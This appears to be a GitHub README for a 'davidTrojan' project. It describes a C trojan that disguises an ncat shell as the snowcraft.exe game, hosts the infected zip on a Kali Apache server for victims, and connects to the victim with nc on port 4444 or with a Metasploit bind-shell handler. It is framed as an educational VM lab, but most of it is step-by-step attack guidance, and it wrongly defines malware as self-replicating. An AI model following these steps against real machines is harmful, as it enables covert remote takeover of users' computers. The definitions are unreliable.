## davidTrojan

This is a simple script (exploit) built with C that tries to demonstrate how to shell shoveling using the Ncat software and the famous snowcraft.exe PC Game. 

This software is intended for educational purposes; the whole experience was developed in controlled VMs that will be explained later.

#### Ncat

It is a software that lets you read and write packets (data transmitted) from a network. Actually it's very useful for things like

1. Monitoring packets on TCP and UDP ports
2. Debugging in **victims machines** without any notice.

#### Explanation

In common scenarios, we have a client machine that represents the victim and a server that hosts the infected file, usually exposed via .exe files (for Windows OS environments).

So, in our victim machine, we have a Windows 7 Home edition, 64 bits, with a bridged network with the [192.168.1.119 ] IP address. The server is a Kali Linux that serves an **infected zip** (please refer to the repo) file using **Apache web server**, with the [192.168.1.133] IP Address.

#### Apache on Kali

Checking the Apache service status (it's already installed)

`systemctl status apache2`

Starting the service

`systemctl start apache2`

Placing the infected files for the victims

`/var/www/html/` directory

#### Trojan vs Malware.

There's a big and principal difference between them, but in simple words, the Malware replicates and infects other machines, and Trojans do not; they locate and hide in memory, and it's harder to detect.

#### Accessing the infected Zip

Since we are using Apache, and both OS are bridged to a main network configuration, both machines have different IP addresses on the same range. So, it's like accessing a simple web server; this time, instead, we use the Host (Kali) IP address to get in.

`http://[IP]/any-directory-created`-for-the-game

When we run the .exe "game" file, it displays the **snowcraft.exe** game, but also triggers the **ncat** command on a **non-common port**, which lets us monitor packets from the network for a later reverse shell.

#### Reverse Shell

If the **Ncat** is running in client mode, on the server side we just `nc [IP][Port]` and we will have control over the victim machine while the program is running.

For this example, we just run: `nc 192.168.1.113 4444` where the **4444** is the **non-common port** for establishing the communication. This previous example works because we know the victim's IP address. 

In case the client is on another network, we can use some alternatives, like checking the Apache server access.log file for getting the victim's IP addresses, or we can run the **nc command** without the IP address, resulting in something like: `nc -l -p 4444`

The last one will work only if the nc utility is running in client mode.

#### Other way: using the Metasploit Framework.

This example is for using the Metasploit framework for finding the user's IP address and accessing it (on Kali).

`msfconsole (accessing the Metasploit framework)`

`msf> use exploit/multi/handler (it's like a module for resolving payloads)`

`msf> set PAYLOAD windows/shell_bind_tcp (connection type)`

`msf> set LPORT 4444`

`msf> set RHOST [target IP address]`

`msf> exploit (running exploit)`

## Credits
[David Lares S](https://davidlares.com)

## License
[MIT](https://opensource.org/licenses/MIT)
